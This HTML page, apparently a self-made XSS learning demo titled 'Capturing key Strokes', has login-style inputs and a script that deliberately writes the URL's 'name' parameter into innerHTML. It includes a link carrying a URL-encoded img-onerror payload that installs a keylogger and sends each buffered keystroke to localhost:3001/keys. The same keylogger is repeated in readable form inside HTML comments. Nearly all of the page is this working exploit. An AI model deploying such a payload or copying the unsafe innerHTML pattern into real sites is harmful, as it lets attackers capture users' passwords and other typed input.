<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
    <title>Capturing key Strokes</title>
  </head>
  <body>
    <h1>Welcome <span id="userName"></span></h1>
    <div>
      <input placeholder="userName" />
    </div>
    <div>
      <input placeholder="password" />
    </div>
    <a
      href="http://127.0.0.1:5500/Security/XSS/vulnerability/capturingkeyStrokes.html?name=%22%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20timeout%3B%20var%20buffer%20%3D%20%27%27%3B%20document.querySelector(%27body%27).addEventListener(%27keypress%27%2C%20function%20(event)%20%7B%20if%20(event.which%20!%3D%3D%200)%20%7B%20clearTimeout(timeout)%3B%20buffer%20%2B%3D%20String.fromCharCode(event.which)%3B%20timeout%20%3D%20setTimeout(function%20()%20%7B%20var%20xhr%20%3D%20new%20XMLHttpRequest()%3B%20var%20uri%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D%27%20%2B%20encodeURIComponent(buffer)%3B%20xhr.open(%27GET%27%2C%20uri)%3B%20xhr.send()%3B%20buffer%20%3D%20%27%27%3B%20%7D%2C%20400)%3B%20%7D%20%7D)%3B%22%3E%22"
    >
      This is a malicious link if you click here, your keys would be tracked by
      the unknown system!
    </a>

    <script>
      const params = new URLSearchParams(globalThis.location.search);
      const name = params.get("name");
      document.getElementById("userName").innerHTML = name;
    </script>

    <!-- <script>
      var timeout;
      var buffer = "";
      document
        .querySelector("body")
        .addEventListener("keypress", function (event) {
          if (event.which !== 0) {
            clearTimeout(timeout);
            buffer += String.fromCharCode(event.which);
            timeout = setTimeout(function () {
              var xhr = new XMLHttpRequest();
              var uri =
                "http://localhost:3001/keys?data=" + encodeURIComponent(buffer);
              xhr.open("GET", uri);
              xhr.send();
              buffer = "";
            }, 400);
          }
        });
    </script> -->
  </body>
</html>

<!-- the script which will get executed inside innerHTML attr when image is not found and onerror is triggered -->
<!-- encodeURIComponent('<img src="does-not-exist" onerror="var timeout; var buffer = \'\'; 
document.querySelector(\'body\').addEventListener(\'keypress\', function (event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which); 
timeout = setTimeout(function () { var xhr = new XMLHttpRequest(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffer = \'\'; }, 400); } });">') -->
